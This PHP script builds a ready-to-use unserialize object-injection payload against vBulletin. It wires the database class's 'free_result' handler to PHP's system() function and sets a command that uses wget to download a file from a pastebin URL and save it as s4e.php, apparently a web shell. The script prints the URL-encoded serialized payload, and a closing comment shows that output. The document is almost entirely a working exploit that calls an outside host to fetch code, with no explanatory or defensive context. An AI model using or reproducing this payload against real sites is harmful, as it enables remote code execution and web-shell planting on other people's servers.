<?php
class vB_Database {
       public $functions = array();

       public function __construct() 
       {
               $this->functions['free_result'] = 'system';
       }
}

class vB_dB_Result {
       protected $db;
       protected $recordset;

       public function __construct()
       {
               $this->db = new vB_Database();
               $this->recordset = 'wget http://pastebin.com/raw.php?i=RnXN0cmY -O s4e.php';
       }
}


echo urlencode(serialize(new vB_dB_Result()));

/* output result :
 O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A54%3A%22wget+http%3A%2F%2Fpastebin.com%2Fraw.php%3Fi%3DRnXN0cmY+-O+s4e.php%22%3B%7D
 */
